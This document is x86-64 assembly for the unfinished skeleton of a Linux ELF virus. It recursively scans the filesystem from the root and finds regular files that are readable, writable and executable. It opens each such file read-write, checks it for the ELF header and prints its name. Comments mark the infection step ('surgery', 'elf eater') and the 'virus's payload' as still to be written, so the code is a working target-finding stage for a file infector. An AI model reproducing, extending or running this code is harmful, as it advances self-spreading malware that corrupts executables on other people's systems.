global _start
section .text
default rel

_start:
    ; enumerate all executable files we can find
    sub rsp, 0x2
    mov byte [rsp], "/"
    mov byte [rsp+1], 0
lsdirs:
    ; open /
    mov rax, 0x2 ; sys_open
    mov rdi, rsp
    mov rsi, dirflags
    xor rdx, rdx
    syscall

    ; skip on failure
    cmp rax, 0x0
    jl end

    push rax
    call lsdirents

    ; close /
    mov rax, 0x3 ; sys_close
    pop rdi
    syscall

    ; done
    jmp end

; LIBRARY SPACE -- not executed sequentially
strlen:
    xor rcx, rcx
strlen_loop:
    cmp byte [rax], 0x0
    jz strlen_done
    inc rax
    inc rcx
    jmp strlen_loop
strlen_done:
    ret

; TODO: actual surgery (will remove direntptr as argument)
; usage: push direntptr ; push fd ; call surgery
surgery:
    push rbp
    mov rbp, rsp

    ; test ELF header
    xor rax, rax
    mov qword rdi, [rbp+0x10]
    sub rsp, 0x4
    mov rsi, rsp
    mov rdx, 0x4
    syscall
    cmp dword [rsp], elf_header_le
    jne surgery_done
    add rsp, 0x4

    ; load direntptr
    mov qword rbx, [rbp+0x18]

    ; get length of dirent name
    lea rax, [rbx+fnofs]
    call strlen
    mov rdx, rcx

    ; print dirent name
;    xor rdx, rdx
;    mov word dx, [rbx+entszofs]
;    sub rdx, fnofs
    mov rax, 0x1
    mov rdi, 0x1
    lea rsi, [rbx+fnofs]
    syscall

    ; prints \n
    sub rsp, 0x1
    mov byte [rsp], 0xa
    mov rax, 0x1
    mov rdi, 0x1
    mov rdx, 0x1
    mov rsi, rsp
    syscall
    add rsp, 0x1
surgery_done:
    mov rsp, rbp
    pop rbp
    ret

; usage: push fd ; call lsdirents
; stack structure: rsp -> rbp | ret addr | dir fd
lsdirents:
    push rbp
    mov rbp, rsp

exterior_loop:
    mov qword rdi, [rbp+0x10] ; function arg: fd
    mov rax, 0xd9 ; sys_getdents64
    mov rdx, direntsz

    sub rsp, direntsz
    mov rsi, rsp
    syscall

    cmp rax, 0x0
    jle lsdirents_done
    mov rbx, rsi

; arguments: rax (size of structure), rbx (address of buffer)
interior_loop:
    push rax ; spill structure size

    xor rdx, rdx
    mov byte dl, [rbx+enttypeofs]
    cmp rdx, dirmode
    jne file_eligibility

    ; safety checks and such
    cmp byte [rbx+fnofs], 0x0
    je interior_loop_end

    cmp word [rbx+fnofs], "."
    je interior_loop_end

    cmp word [rbx+fnofs], ".."
    je interior_loop_end

recurse_on_dir:
    mov rax, 0x101 ; sys_openat
    mov qword rdi, [rbp+0x10] ; function arg: fd
    lea rsi, [rbx+fnofs]
    mov rdx, dirflags
    xor r10, r10
    syscall

    ; skip on open error
    cmp rax, 0x0
    jle interior_loop_end

    ; spill structure pointer
    push rbx
    ; pass fd arg
    push rax
    call lsdirents

    ; close the subservient file descriptor
    mov rax, 0x3 ; sys_close
    pop rdi
    syscall

    ; restore structure pointer
    pop rbx

    ; skip surgery on directories
    jmp interior_loop_end

file_eligibility:
    ; ignore links and sockets and weird stuff
    cmp byte [rbx+enttypeofs], filemode
    jne interior_loop_end

    ; test that the file can be read, written, and executed
    mov rax, 0x10d ; sys_faccessat
    mov qword rdi, [rbp+0x10]
    lea rsi, [rbx+fnofs]
    mov rdx, accessflags
    syscall
    test rax, rax
    jnz interior_loop_end

    ; TODO: elf eater here
    mov rax, 0x101 ; sys_openat
    ; leave rdi and rsi from access call
    mov rdx, fileflags
    xor r10, r10
    syscall

    push rbx
    push rax
    call surgery
    
    ; close file
    mov rax, 0x3 ; sys_close
    pop rdi
    syscall
    ; restore structure pointer
    pop rbx

interior_loop_end:
    pop rax ; un-spill structure size
    xor rdx, rdx
    mov word dx, [rbx+entszofs]
    sub rax, rdx
    add rbx, rdx

    cmp rax, 0x0
    jle exterior_loop
    jmp interior_loop   

lsdirents_done:
    mov rsp, rbp
    pop rbp
    ret

end:
    ; TODO: this is where the virus's payload would go
    jmp regular_program_address
regular_program_address:
    mov rax, 0x3c
    xor rdi, rdi
    syscall

symbols:
    elf_header_le equ 0x464c457f
    elf_header_be equ 0x7f454c46
    direntsz equ 280
    fnofs equ 19
    entszofs equ 16
    enttypeofs equ 18
    dirmode equ 4
    filemode equ 8
    dirflags equ 0x10000 ; O_RDONLY | O_DIRECTORY
    fileflags equ 0x2 ; O_RDWR
    ; accessflags equ 0x6 ; R_OK | W_OK
    accessflags equ 0x7 ; R_OK | W_OK | X_OK
